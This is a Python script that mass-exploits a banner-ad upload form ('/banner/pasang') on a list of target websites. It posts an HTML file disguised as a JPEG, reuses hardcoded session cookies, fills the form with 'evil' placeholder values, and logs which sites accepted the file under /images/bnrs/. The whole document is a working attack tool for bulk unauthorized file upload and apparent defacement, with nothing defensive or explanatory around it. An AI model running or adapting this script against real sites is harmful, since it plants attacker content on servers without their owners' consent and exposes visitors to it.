import requests
import os
import random
import time
import signal
from colorama import init, Fore, Style

init(autoreset=True)

FILE_NAME = "banners.html"
LIST_FILE = "list.txt"
UPLOAD_PATH = "/banner/pasang"

COOKIES = {
    "_iwmc": "1",
    "iwmsess": "91p0tUI89%2BvE1j8sSIzIWCWzL7SjWG9%2FGCeC53..."
}

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Referer": ""
}

running = True
def handle_interrupt(sig, frame):
    global running
    print(Fore.YELLOW + "\n[!] Cancel OK...")
    running = False

signal.signal(signal.SIGINT, handle_interrupt)

def get_payload():
    return {
        "type": "free",
        "name": "evil",
        "email": "evil@evil.com",
        "phone": "123123123",
        "posisiid": "1",
        "masatayang": "1",
        "website": "evil.com",
        "note": "evilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevilevil",
        "scode": "jhspB",
        "task": "Pasang",
    }

def log_result(filename, content):
    with open(filename, "a") as f:
        f.write(content + "\n")

def upload(target):
    try:
        url = target.strip() + UPLOAD_PATH
        HEADERS["Referer"] = target.strip() + "/banner/pasang"
        files = {
            "image": (FILE_NAME, open(FILE_NAME, "rb"), "image/jpeg")
        }
        r = requests.post(url, data=get_payload(), files=files, headers=HEADERS, cookies=COOKIES, timeout=15)

        if "/images/bnrs/" in r.text or "Berhasil" in r.text or "iklan Anda telah terkirim" in r.text:
            print(Fore.GREEN + f"[+] Success: {target}/images/bnrs/{FILE_NAME}")
            log_result("success.txt", f"{target}/images/bnrs/{FILE_NAME}")
        else:
            print(Fore.RED + f"[-] Failed: {target} (status: {r.status_code})")
            log_result("failed.txt", target)
    except Exception as e:
        print(Fore.YELLOW + f"[!] Error on {target}: {str(e)}")
        log_result("failed.txt", target)

def main():
    if not os.path.exists(FILE_NAME):
        print(Fore.RED + f"[!] File '{FILE_NAME}' not found!")
        return

    try:
        with open(LIST_FILE, "r") as f:
            targets = f.readlines()
    except Exception as e:
        print(Fore.RED + f"[!] Gagal baca {LIST_FILE}: {str(e)}")
        return

    for target in targets:
        if not running:
            break
        if not target.strip():
            continue
        upload(target)
        time.sleep(random.uniform(1, 2))

if __name__ == "__main__":
    main()
